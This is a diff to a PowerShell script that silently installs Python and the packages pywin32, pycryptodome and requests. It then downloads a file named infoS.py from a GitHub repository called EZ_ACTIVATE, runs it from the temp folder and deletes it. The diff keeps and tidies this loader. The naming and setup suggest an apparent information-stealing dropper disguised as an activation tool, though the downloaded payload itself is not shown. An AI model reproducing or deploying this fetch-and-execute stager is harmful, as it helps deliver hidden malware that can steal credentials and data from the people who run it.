@@ -1,15 +1,23 @@
-if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
-    winget install --id Python.Python.3 --accept-package-agreements --accept-source-agreements
-    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
+# Check if Python is installed
+$pythonPath = Get-Command python -ErrorAction SilentlyContinue
+if (-not $pythonPath) {
+    winget install --id Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements
+    # Refresh environment
+    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine")
 }
 
-$requiredPackages = @("pywin32", "pypiwin32", "pycryptodome", "requests")
+# Ensure pip is available
+& python -m ensurepip --upgrade
+
+# Install required packages
+$requiredPackages = @("pywin32", "pycryptodome", "requests")
 foreach ($package in $requiredPackages) {
-    python -m pip install $package --quiet --disable-pip-version-check
+    & python -m pip install $package --quiet --disable-pip-version-check --upgrade
 }
 
+# Download and run script
 $url = "https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/refs/heads/main/infoS.py"
-$tempFile = "$env:TEMP\infoS.py"
-Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
-python $tempFile
+$tempFile = Join-Path $env:TEMP "infoS.py"
+Invoke-WebRequest -Uri $url -OutFile $tempFile
+& python $tempFile
 Remove-Item $tempFile
